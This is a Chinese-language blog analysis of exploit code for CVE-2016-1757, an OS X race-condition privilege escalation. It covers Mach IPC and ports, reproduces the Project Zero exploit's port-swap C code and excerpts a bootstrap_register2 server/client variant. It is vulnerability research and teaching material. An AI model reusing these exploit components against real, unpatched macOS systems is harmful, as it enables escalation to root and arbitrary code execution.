<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">void</span>*				address;</span><br><span class="line"><span class="preprocessor">#<span class="keyword">if</span> !defined(__LP64__)</span></span><br><span class="line">  <span class="keyword">mach_msg_size_t</span>       	size;</span><br><span class="line"><span class="preprocessor">#<span class="keyword">endif</span></span></span><br><span class="line">  <span class="keyword">boolean_t</span>     		deallocate: <span class="number">8</span>;</span><br><span class="line">  <span class="keyword">mach_msg_copy_options_t</span>       copy: <span class="number">8</span>;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span>     		pad1: <span class="number">8</span>;</span><br><span class="line">  <span class="keyword">mach_msg_descriptor_type_t</span>    type: <span class="number">8</span>;</span><br><span class="line"><span class="preprocessor">#<span class="keyword">if</span> defined(__LP64__)</span></span><br><span class="line">  <span class="keyword">mach_msg_size_t</span>       	size;</span><br><span class="line"><span class="preprocessor">#<span class="keyword">endif</span></span></span><br><span class="line">&#125; <span class="keyword">mach_msg_ool_descriptor_t</span>;</span><br></pre></td></tr></table></figure>
<h2 id="1-2_ports">1.2 ports</h2><h3 id="1-2-1_port_的权限">1.2.1 port 的权限</h3><p>每一条<code>Mach Message</code>都是从一个<code>port</code>发送到另外一个<code>port</code>，而每一个<code>port</code>都有自己的权限。</p>
<ul>
<li>SEND：将<code>Mach Message</code>添加到<code>port</code>的队列中。</li>
<li>RECIVE：允许从队列中读取<code>Mach Message</code>。一般情况下只有<code>port</code>的持有者拥有这个权利。</li>
</ul>
<p><code>port</code>以及他的<code>权限</code>，可以从一个进程转交给另外一个进程，这也就是这一次要分析的<code>EXP</code>的主要原理。</p>
<h3 id="1-2-2_一些特殊的port">1.2.2 一些特殊的port</h3><p>当每一个<code>task</code>被创建的时候，系统都会提供一系列特殊的<code>port</code>，在这些<code>port</code>当中，我们比较感兴趣的是以下几种：</p>
<ul>
<li>host port：代表正在运行该<code>task</code>的整台机器的<code>port</code>。</li>
<li>task port: 正在运行的<code>task</code>本身的<code>port</code>。</li>
<li>bootstrap port : 和<code>bootstrap server</code>连接着的一个<code>port</code>。</li>
</ul>
<h2 id="1-3_Send&amp;Recv_Messages">1.3 Send&amp;Recv Messages</h2><p><code>Message</code>的发送与接收，都是使用同一个<code>mach API</code>，<code>mach_msg</code>。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">kr = mach_msg(recv_hdr,              <span class="comment">// message buffer</span></span><br><span class="line">              msg_options,          <span class="comment">// option indicating receive</span></span><br><span class="line">              <span class="number">0</span>,                     <span class="comment">// send size</span></span><br><span class="line">              recv_hdr-&gt;msgh_size,   <span class="comment">// size of header + body</span></span><br><span class="line">              server_port,           <span class="comment">// receive name</span></span><br><span class="line">              MACH_MSG_TIMEOUT_NONE, <span class="comment">// no timeout, wait forever</span></span><br><span class="line">              MACH_PORT_NULL);       <span class="comment">// no notification port</span></span><br><span class="line"></span><br><span class="line">kr = mach_msg(send_hdr,              <span class="comment">// message buffer</span></span><br><span class="line">              MACH_SEND_MSG,         <span class="comment">// option indicating send</span></span><br><span class="line">              send_hdr-&gt;msgh_size,   <span class="comment">// size of header + body</span></span><br><span class="line">              <span class="number">0</span>,                     <span class="comment">// receive limit</span></span><br><span class="line">              MACH_PORT_NULL,        <span class="comment">// receive name</span></span><br><span class="line">              MACH_MSG_TIMEOUT_NONE, <span class="comment">// no timeout, wait forever</span></span><br><span class="line">              MACH_PORT_NULL);       <span class="comment">// no notification port</span></span><br></pre></td></tr></table></figure>
<p>根据参数的不同，实现了接收<code>Message</code>和发送<code>Message</code>不同的功能。</p>
<p>通过对源码的阅读，<code>mach_msg</code>实际上是调用了<code>mach_msg_overwrite_trap</code>，进入内核中，通过<code>ipc_kmsg_*</code>系列函数，来实现的消息发送与接收。大致如下图所示。</p>
<p><img src="http://blog.ibireme.com/wp-content/uploads/2015/05/RunLoop_5.png" alt=""></p>
<p>图片转自(<a href="http://blog.ibireme.com/2015/05/18/runloop/)。" target="_blank" rel="external">http://blog.ibireme.com/2015/05/18/runloop/)。</a></p>
<h2 id="0x02_The_Port_Swap_Dance">0x02 The Port Swap Dance</h2><p>了解了<code>port</code>和<code>Mach Message</code>的基础知识之后，先来回顾一下我们已经<a href="https://bugs.chromium.org/p/project-zero/issues/attachment?aid=226154" target="_blank" rel="external">分析过的EXP中</a>，有这样一段代码。</p>
<h3 id="2-1_源码">2.1 源码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;</span><br><span class="line">  <span class="keyword">mach_msg_header_t</span> header;</span><br><span class="line">  <span class="keyword">mach_msg_body_t</span> body;</span><br><span class="line">  <span class="keyword">mach_msg_port_descriptor_t</span> port;</span><br><span class="line">&#125; <span class="keyword">port_msg_send_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// mach message for receiving a port right</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;</span><br><span class="line">  <span class="keyword">mach_msg_header_t</span> header;</span><br><span class="line">  <span class="keyword">mach_msg_body_t</span> body;</span><br><span class="line">  <span class="keyword">mach_msg_port_descriptor_t</span> port;</span><br><span class="line">  <span class="keyword">mach_msg_trailer_t</span> trailer;</span><br><span class="line">&#125; <span class="keyword">port_msg_rcv_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;</span><br><span class="line">  <span class="keyword">mach_msg_header_t</span>  header;</span><br><span class="line">&#125; <span class="keyword">simple_msg_send_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;</span><br><span class="line">  <span class="keyword">mach_msg_header_t</span>  header;</span><br><span class="line">  <span class="keyword">mach_msg_trailer_t</span> trailer;</span><br><span class="line">&#125; <span class="keyword">simple_msg_rcv_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> STOLEN_SPECIAL_PORT TASK_BOOTSTRAP_PORT</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// a copy in the parent of the stolen special port such that it can be restored</span></span><br><span class="line"><span class="keyword">mach_port_t</span> saved_special_port = MACH_PORT_NULL;</span><br><span class="line"></span><br><span class="line"><span class="comment">// the shared port right in the parent</span></span><br><span class="line"><span class="keyword">mach_port_t</span> shared_port_parent = MACH_PORT_NULL;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">setup_shared_port</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">kern_return_t</span> err;</span><br><span class="line">  <span class="comment">// get a send right to the port we're going to overwrite so that we can both</span></span><br><span class="line">  <span class="comment">// restore it for ourselves and send it to our child</span></span><br><span class="line">  err = task_get_special_port(mach_task_self(), STOLEN_SPECIAL_PORT, &amp;saved_special_port);</span><br><span class="line">  MACH_ERR(<span class="string">"saving original special port value"</span>, err);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// allocate the shared port we want our child to have a send right to</span></span><br><span class="line">  err = mach_port_allocate(mach_task_self(),</span><br><span class="line">                           MACH_PORT_RIGHT_RECEIVE,</span><br><span class="line">                           &amp;shared_port_parent);</span><br><span class="line"></span><br><span class="line">  MACH_ERR(<span class="string">"allocating shared port"</span>, err);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// insert the send right</span></span><br><span class="line">  err = mach_port_insert_right(mach_task_self(),</span><br><span class="line">                               shared_port_parent,</span><br><span class="line">                               shared_port_parent,</span><br><span class="line">                               MACH_MSG_TYPE_MAKE_SEND);</span><br><span class="line">  MACH_ERR(<span class="string">"inserting MAKE_SEND into shared port"</span>, err);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// stash the port in the STOLEN_SPECIAL_PORT slot such that the send right survives the fork</span></span><br><span class="line">  err = task_set_special_port(mach_task_self(), STOLEN_SPECIAL_PORT, shared_port_parent);</span><br><span class="line">  MACH_ERR(<span class="string">"setting special port"</span>, err);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">mach_port_t</span> recover_shared_port_child() &#123;</span><br><span class="line">  <span class="keyword">kern_return_t</span> err;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// grab the shared port which our parent stashed somewhere in the special ports</span></span><br><span class="line">  <span class="keyword">mach_port_t</span> shared_port_child = MACH_PORT_NULL;</span><br><span class="line">  err = task_get_special_port(mach_task_self(), STOLEN_SPECIAL_PORT, &amp;shared_port_child);</span><br><span class="line">  MACH_ERR(<span class="string">"child getting stashed port"</span>, err);</span><br><span class="line"></span><br><span class="line">  LOG(<span class="string">"child got stashed port"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// say hello to our parent and send a reply port so it can send us back the special port to restore</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// allocate a reply port</span></span><br><span class="line">  <span class="keyword">mach_port_t</span> reply_port;</span><br><span class="line">  err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &amp;reply_port);</span><br><span class="line">  MACH_ERR(<span class="string">"child allocating reply port"</span>, err); </span><br><span class="line"></span><br><span class="line">  <span class="comment">// send the reply port in a hello message</span></span><br><span class="line">  <span class="keyword">simple_msg_send_t</span> msg = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">  msg.header.msgh_size = <span class="keyword">sizeof</span>(msg);</span><br><span class="line">  msg.header.msgh_local_port = reply_port;</span><br><span class="line">  msg.header.msgh_remote_port = shared_port_child;</span><br><span class="line">  msg.header.msgh_bits = MACH_MSGH_BITS (MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND_ONCE);</span><br><span class="line"></span><br><span class="line">  err = mach_msg_send(&amp;msg.header);</span><br><span class="line">  MACH_ERR(<span class="string">"child sending task port message"</span>, err);</span><br><span class="line"> </span><br><span class="line">  LOG(<span class="string">"child sent hello message to parent over shared port"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// wait for a message on the reply port containing the stolen port to restore</span></span><br><span class="line">  <span class="keyword">port_msg_rcv_t</span> stolen_port_msg = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  err = mach_msg(&amp;stolen_port_msg.header, MACH_RCV_MSG, <span class="number">0</span>, <span class="keyword">sizeof</span>(stolen_port_msg), reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);</span><br><span class="line">  MACH_ERR(<span class="string">"child receiving stolen port\n"</span>, err);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// extract the port right from the message</span></span><br><span class="line">  <span class="keyword">mach_port_t</span> stolen_port_to_restore = stolen_port_msg.port.name;</span><br><span class="line">  <span class="keyword">if</span> (stolen_port_to_restore == MACH_PORT_NULL) &#123;</span><br><span class="line">    FAIL(<span class="string">"child received invalid stolen port to restore"</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// restore the special port for the child</span></span><br><span class="line">  err = task_set_special_port(mach_task_self(), STOLEN_SPECIAL_PORT, stolen_port_to_restore);</span><br><span class="line">  MACH_ERR(<span class="string">"child restoring special port"</span>, err);</span><br><span class="line"></span><br><span class="line">  LOG(<span class="string">"child restored stolen port"</span>);</span><br><span class="line">  <span class="keyword">return</span> shared_port_child;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">mach_port_t</span> recover_shared_port_parent() &#123;</span><br><span class="line">  <span class="keyword">kern_return_t</span> err;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// restore the special port for ourselves</span></span><br><span class="line">  err = task_set_special_port(mach_task_self(), STOLEN_SPECIAL_PORT, saved_special_port);</span><br><span class="line">  MACH_ERR(<span class="string">"parent restoring special port"</span>, err);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// wait for a message from the child on the shared port</span></span><br><span class="line">  <span class="keyword">simple_msg_rcv_t</span> msg = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  err = mach_msg(&amp;msg.header,</span><br><span class="line">                 MACH_RCV_MSG,</span><br><span class="line">                 <span class="number">0</span>,</span><br><span class="line">                 <span class="keyword">sizeof</span>(msg),</span><br><span class="line">                 shared_port_parent,</span><br><span class="line">                 MACH_MSG_TIMEOUT_NONE,</span><br><span class="line">                 MACH_PORT_NULL);</span><br><span class="line">  MACH_ERR(<span class="string">"parent receiving child hello message"</span>, err);</span><br><span class="line"></span><br><span class="line">  LOG(<span class="string">"parent received hello message from child"</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// send the special port to our child over the hello message's reply port</span></span><br><span class="line">  <span class="keyword">port_msg_send_t</span> special_port_msg = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">  special_port_msg.header.msgh_size        = <span class="keyword">sizeof</span>(special_port_msg);</span><br><span class="line">  special_port_msg.header.msgh_local_port  = MACH_PORT_NULL;</span><br><span class="line">  special_port_msg.header.msgh_remote_port = msg.header.msgh_remote_port;</span><br><span class="line">  special_port_msg.header.msgh_bits        = MACH_MSGH_BITS(MACH_MSGH_BITS_REMOTE(msg.header.msgh_bits), <span class="number">0</span>) | MACH_MSGH_BITS_COMPLEX;</span><br><span class="line"></span><br><span class="line">  special_port_msg.body.msgh_descriptor_count = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  special_port_msg.port.name        = saved_special_port;</span><br><span class="line">  special_port_msg.port.disposition = MACH_MSG_TYPE_COPY_SEND;</span><br><span class="line">  special_port_msg.port.type        = MACH_MSG_PORT_DESCRIPTOR;</span><br><span class="line"></span><br><span class="line">  err = mach_msg_send(&amp;special_port_msg.header);</span><br><span class="line">  MACH_ERR(<span class="string">"parent sending special port back to child"</span>, err);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">return</span> shared_port_parent;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span> </span>&#123;</span><br><span class="line">  parse_args(argc, argv);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// check that the original is actually a 64-bit mach-o and not a fat binary</span></span><br><span class="line">  verify_original(original, original_length);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// apply the patch to the original</span></span><br><span class="line">  apply_patch(original, original_length, patch, patch_length);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> tries = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">    setup_shared_port();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">pid_t</span> child_pid = fork();</span><br><span class="line">    <span class="keyword">if</span> (child_pid == -<span class="number">1</span>) &#123;</span><br><span class="line">      FAIL(<span class="string">"forking"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (child_pid == <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">mach_port_t</span> shared_port_child = recover_shared_port_child();</span><br><span class="line">      do_child(shared_port_child);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">mach_port_t</span> shared_port_parent = recover_shared_port_parent();</span><br><span class="line">      do_parent(shared_port_parent);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">int</span> status;</span><br><span class="line">      wait(&amp;status);</span><br><span class="line">      </span><br><span class="line">      <span class="keyword">if</span> (status == <span class="number">0</span>) &#123;</span><br><span class="line">        LOG(<span class="string">"worked :-)"</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      tries++;</span><br><span class="line">      <span class="keyword">if</span> (tries &gt; max_tries) &#123;</span><br><span class="line">        FAIL(<span class="string">"either didn't win the race (try again) or we won but the child didn't exit cleanly with a 0 return code"</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      </span><br><span class="line">      LOG(<span class="string">"trying again..."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>通过一个<code>saved_special_port</code>完成了，父进程与子进程之间的<code>port</code>传递，从而使得父进程与子进程共享同一个<code>port</code>，子进程再通过共享的<code>port</code>，将自身的<code>task</code>的<code>port</code>发送给父进程并最终在父进程中实现对子进程代码段修改，执行任意代码，详情见<a href="http://turingh.github.io/2016/04/03/CVE-2016-1757%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/">这里</a>。</p>
<h3 id="2-2_解析">2.2 解析</h3><ol>
<li>父进程通过<code>task_get_special_port</code>获取他的<code>special ports</code>，并存储在局部变量中。<code>special ports</code>是一些连接着系统服务的<code>port</code>，在<code>fork</code>的过程中，子进程会继承<code>special port</code>。</li>
<li>父进程通过<code>mach_port_allocate</code>函数创建一个新的<code>port</code>，通过<code>task_set_special_port</code>将这个新的<code>port</code>设为<code>special port</code>，且通过<code>mach_port_insert_right</code>为这个新的<code>port</code>赋予写的权限。并最终试图将这个新的<code>port</code>传递给子进程。</li>
<li>父进程进行<code>fork</code>，子进程继承了<em>[2]</em>中创建的新的<code>port</code>，作为自己的<code>special port</code>。</li>
<li>父进程将保存的在临时变量中的<code>special port</code>，重新设置回来。</li>
<li>子进程获取这个替换过的<code>special port</code>，并且保存下来。</li>
<li>子进程通过继承的<code>special port</code>和父进程通信。</li>
<li>父进程在收到子进程的消息后，将当前的<code>special port</code>再发送给子进程。</li>
<li>子进程也将收到的<code>special port</code>设置为自己的<code>special port</code>。</li>
</ol>
<p>时序图大致如下：</p>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/CVE-2016-1757/port_dance.png" alt="port dance"></p>
<p>通过上面的分析，可以得知，再利用这个漏洞的时候，我们想要的就是一个父进程与子进程共同持有，且可以用来交流的<code>port</code>，通过这个<code>port</code>，子进程可以将自己的<code>task port</code>交给另外一个进程，这里是父进程，来实现漏洞的利用。</p>
<h1 id="0x03_server&amp;client">0x03 server&amp;client</h1><p>那么新的<code>EXP</code>使用了什么方法实现的呢？</p>
<h2 id="3-1_bootstrap_register">3.1 bootstrap_register</h2><p>每一个<code>task</code>可以调用<code>bootstrap_register()</code>函数，向<code>bootstrap server</code>注册一个服务，通过一个字符串与自己的<code>task port</code>相关联。其他的<code>task</code>可以通过<code>bootstrap_look_up</code>函数来通过字符串查询对应的<code>task</code>的<code>port</code>。</p>
<p>那么问题就一目了然了。</p>
<ul>
<li>建了一个进程A，通过<code>bootstrap_register</code>注册一个服务。</li>
<li>建立一个进程B，通过<code>bootstrap_look_up</code>获取进程A的<code>task port</code>。</li>
<li>进程B通过进程A的<code>task port</code>将自己的<code>task port</code>告知进程A。</li>
<li>进程A通过进程B的<code>task port</code>配合进程B，出发漏洞。</li>
</ul>
<p>​    </p>
<h2 id="3-2_bootstrap_register2">3.2 bootstrap_register2</h2><p>这个方案虽然简单明了，但是缺有一个问题，<code>bootstrap_register</code>在10.5之后的版本就没有了。</p>
<p>不过网上有个一简单的替代方法，在-[NSMachBootstrapServer registerPort:name:]中封装了一个<code>bootstrap_register2</code>，只不过并没有导出到外部，所以只需要添加一行代码就可以使用<code>bootstrap_register2</code>来完成相应的功能。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span><br><span class="line"> * this is not exported so we need to declare it</span><br><span class="line"> * we need to use this because bootstrap_create_server is broken in Yosemite</span><br><span class="line"> */</span></span><br><span class="line"><span class="function"><span class="keyword">extern</span> kern_return_t <span class="title">bootstrap_register2</span><span class="params">(mach_port_t bp, name_t service_name, mach_port_t sp, <span class="keyword">int</span> flags)</span></span>;</span><br></pre></td></tr></table></figure>
<h2 id="3-3_实际代码">3.3 实际代码</h2><p>摘取利用代码中相关代码段。</p>
<p>mach_server.c</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/* register the server with launchd */</span></span><br><span class="line">kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &amp;server_port);</span><br><span class="line">   </span><br><span class="line">kr = mach_port_insert_right(mach_task_self(), server_port, server_port, MACH_MSG_TYPE_MAKE_SEND);</span><br><span class="line"></span><br><span class="line">kr = bootstrap_register2(bootstrap_port, SERVICE_NAME, server_port, <span class="number">0</span>);</span><br><span class="line"> </span><br><span class="line"><span class="comment">/* alternative method to register with launchd */</span></span><br></pre></td></tr></table></figure>
<p>mach_client.c</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">DEBUG_MSG(<span class="string">"Looking up server..."</span>);</span><br><span class="line">kr = bootstrap_look_up(bootstrap_port, SERVICE_NAME, &amp;server_port);</span><br><span class="line">EXIT_ON_MACH_ERROR(<span class="string">"bootstrap_look_up"</span>, kr, BOOTSTRAP_SUCCESS);</span><br><span class="line"></span><br><span class="line">kr = mach_port_allocate(mach_task_self(),        <span class="comment">// our task is acquiring</span></span><br><span class="line">                        MACH_PORT_RIGHT_RECEIVE, <span class="comment">// a new receive right</span></span><br><span class="line">                        &amp;client_port);           <span class="comment">// with this name</span></span><br></pre></td></tr></table></figure>
<h1 id="0x04_小结">0x04 小结</h1><p>有兴趣的读者可以仔细阅读<a href="https://github.com/gdbinit/mach_race" target="_blank" rel="external">fG!的利用</a>，与之前的利用代码的不同之处并不止在<code>mach message</code>的利用这一点上。以后有时间还会做出更细致的分析。</p>
<h1 id="引用">引用</h1><p>1.Inter-Process Communication</p>
<p><a href="http://nshipster.com/inter-process-communication/" target="_blank" rel="external">http://nshipster.com/inter-process-communication/</a></p>
<p>2.Debugging Mach Ports</p>
<p><a href="https://robert.sesek.com/2012/1/debugging_mach_ports.html" target="_blank" rel="external">https://robert.sesek.com/2012/1/debugging_mach_ports.html</a></p>
<p>3.Changes to XNU Mach IPC</p>
<p><a href="https://robert.sesek.com/2014/1/changes_to_xnu_mach_ipc.html" target="_blank" rel="external">https://robert.sesek.com/2014/1/changes_to_xnu_mach_ipc.html</a></p>
<p>4.A Little IPC Project</p>
<p><a href="http://www.nongnu.org/hurdextras/ipc_guide/mach_ipc_basic_concepts.html" target="_blank" rel="external">http://www.nongnu.org/hurdextras/ipc_guide/mach_ipc_basic_concepts.html</a></p>
<p>5.深入理解RunLoop</p>
<p><a href="http://blog.ibireme.com/2015/05/18/runloop/" target="_blank" rel="external">http://blog.ibireme.com/2015/05/18/runloop/</a></p>
<h1 id="PS">PS</h1><p>这是我的学习分享博客<a href="http://turingh.github.io/">http://turingh.github.io/</a></p>
<p>欢迎大家来探讨，不足之处还请指正。</p>
]]></content>
    <summary type="html">
    <![CDATA[<h1 id="0x00_摘要">0x00 摘要</h1><p><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-1757">CVE-2016-1757</a>是一个<code>OS X</code>系统上通过条件竞争实现任意代码在<code>root</code>权限执行的漏洞。在这篇文章之前，我已经分析过了这个漏洞的原理，以及<code>EXP</code>代码的实现。</p>
<p><a href="http://turingh.github.io/2016/04/03/CVE-2016-1757%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/">CVE-2016-1757简单分析</a></p>
<p><a href="http://turingh.github.io/2016/04/19/CVE-2016-1757%E5%88%A9%E7%94%A8%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90/">CVE-2016-1757利用程序分析</a></p>
<p><a href="http://turingh.github.io/2016/04/13/%E5%88%A9%E7%94%A8patch%E7%BB%95%E8%BF%87kextload%E5%AF%B9%E5%86%85%E6%A0%B8%E7%AD%BE%E5%90%8D%E7%9A%84%E6%A3%80%E6%B5%8B/">利用patch绕过kextload对内核签名的检测</a></p>
<p>在<code>syscan2016</code>上又有国外的安全研究人员放出自己的<a href="https://github.com/gdbinit/mach_race">利用代码</a>。学习之后，这个利用代码确实比之前的更加清晰、明确。更加容易理解。</p>
